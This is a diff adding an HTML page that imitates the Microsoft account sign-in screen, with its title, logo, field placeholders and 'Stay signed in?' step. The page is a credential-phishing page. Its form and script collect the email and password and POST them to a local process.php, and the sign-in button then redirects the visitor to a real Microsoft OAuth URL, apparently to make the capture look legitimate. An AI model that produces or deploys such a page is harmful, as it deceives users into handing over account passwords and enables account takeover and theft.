@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
+</head>
+
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft">
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form method="POST" action="process.php">
+                <!-- Email input -->
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" required />
+                </div>
+                <!-- Password input -->
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" required />
+                </div>
+                <!-- Consent checkbox -->
+                <div class="mb-16">
+                    <label class="has-checkbox">
+                        <input type="checkbox" name="consent" required />
+                        <span>I consent to the processing of my data.</span>
+                    </label>
+                </div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="https://microsoft.com/signup" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="https://microsoft.com/signup" class="link">Sign in with a security key
+                        <img src="assets/question.png" alt="Question img">
+                    </a>
+                </p>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size: 15px;">
+                <span class="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options
+            </p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity"></span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"><a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign In</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity"></span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script>
+        document.getElementById('btn_sig').addEventListener('click', function () {
+            window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.microsoft365.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638325504441335917.OGQ5NmRhMTMtNTQ4Zi00ODMyLWEz131itY2IwZjE2N2M1NTRlZjMx13308OWYtYjdlZC00ZjQ4LWI5MGMtYzQ4OTQ4NGNjMWJl&ui_locales=en-US&mkt=en-US&client-request-id=1de72fd9-20b0-4ca7-ba6c-e6b70c3cfe47&state=fCZIMWehj42H3Vo_GAzCm9IsXA8-wgi8gxAL6_Ny67MFSVxhx31QcAipaOzPcjlSWPqKLdq7VXr2YwNfT7AC4d4kWOmuROvl-D635vg5vuPWAqDC8fX2_cR6J3KZT0UUlxcs4tzQrNqhuC3nhjNMi2ozRX0jqolLWk8089eogkFOv9GgvfAL0uTooNzPsVBXiXZNVDJ9Yl356nwrI-nXuiZCjFjk7JvXL6eZcdoixRjnHuLajIsyAknCynhkG1CEKQlXmsHNeVvPMoUaAqHATRIkUBlbv86_JxKsX4E7b7s&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0";
+        });
+
+        // JavaScript code for form submission
+        const form = document.querySelector('form');
+        const emailInput = document.getElementById('inp_uname');
+        const passwordInput = document.getElementById('inp_pwd');
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            // Get the values of email and password inputs
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            // Perform any client-side validation here
+
+            // Create a FormData object to send the data to the server
+            const formData = new FormData();
+            formData.append('uname', email);
+            formData.append('pass', password);
+
+            // Send the data to the server using Fetch API
+            fetch('process.php', {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => {
+                // Handle the response from the server
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+
+</html>
